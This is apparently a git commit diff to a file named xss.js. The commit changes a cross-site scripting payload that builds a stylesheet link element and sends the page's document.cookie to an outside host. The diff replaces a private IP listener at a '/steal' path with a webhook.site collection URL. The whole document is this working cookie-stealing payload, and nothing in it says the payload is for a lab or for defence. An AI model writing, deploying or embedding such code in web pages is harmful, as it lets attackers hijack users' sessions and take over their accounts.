829ea08f3e6e44aff33a8b49ba68e448767b2d9e
TrishaSrikanth-459 <73068694+TrishaSrikanth-459@users.noreply.github.com>
2026-02-26 18:46:25 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,6 @@
 var link = document.createElement('link');
 link.rel = 'stylesheet';
-link.href = 'http://10.207.33.142:8000/steal?cookie=' + document.cookie;
+link.href = 'https://webhook.site/6518a512-ed1a-4c0c-b626-13a69d0a4135/steal?cookie=' + document.cookie;
 document.head.appendChild(link);
+
+
